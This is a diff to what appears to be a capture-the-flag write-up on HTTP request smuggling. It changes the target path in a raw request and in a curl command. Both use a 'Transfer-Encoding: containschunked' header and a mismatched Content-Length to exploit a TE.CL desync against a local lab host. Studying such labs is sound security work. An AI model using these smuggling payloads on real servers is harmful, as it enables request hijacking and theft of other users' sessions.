@@ -30,7 +30,7 @@ on the /transmission endpoint by right clicking on the POST request in Burp Repe
 To solve the challenge, an HTTP request should be smuggled to the backend by abusing a TE.CL mismatch, the exploit can performed as seen below: (if it is done using BurpSuite Repeater, "Update Content-Length" should be turned off, also very important to have an new line after the 0)
 
 ```http
-GET /post/2 HTTP/1.1
+GET /post/main HTTP/1.1
 Host: HOST:PORT
 Transfer-Encoding: containschunked
 Content-Length: 4
@@ -65,7 +65,7 @@ Cookie: session=value
 
 ### SMUGGLING
 ```
-curl -X GET "http://localhost:8002/post/2" \
+curl -X GET "http://localhost:8002/post/main" \
     -H "Host: HOST:PORT" \
     -H "Transfer-Encoding: containschunked" \
     -H "Content-Length: 4" \
